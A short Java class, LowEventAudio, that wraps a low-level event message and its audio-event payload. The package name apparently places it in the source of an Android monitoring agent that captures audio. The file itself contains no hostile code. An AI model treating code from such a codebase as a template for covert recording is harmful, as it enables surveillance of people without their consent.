package com.android.dvci.module.message;

/**
 * Created by zad on 15/06/15.
 */


import com.android.dvci.event.LowEvent.AudioEvent;
import com.android.dvci.util.LowEvent;
import com.android.dvci.util.LowEventMsg;

import java.io.Serializable;
import java.lang.ref.WeakReference;

/**
 * Created by zad on 05/06/15.
 */
public class LowEventAudio  {
	private static final String TAG = "LowEventAudio"; //$NON-NLS-1$
	public LowEventMsg event;
	public AudioEvent audio_data;

	public LowEventAudio(LowEventMsg event) {
		this.event = event;
		this.audio_data = (AudioEvent) event.data;
	}

}

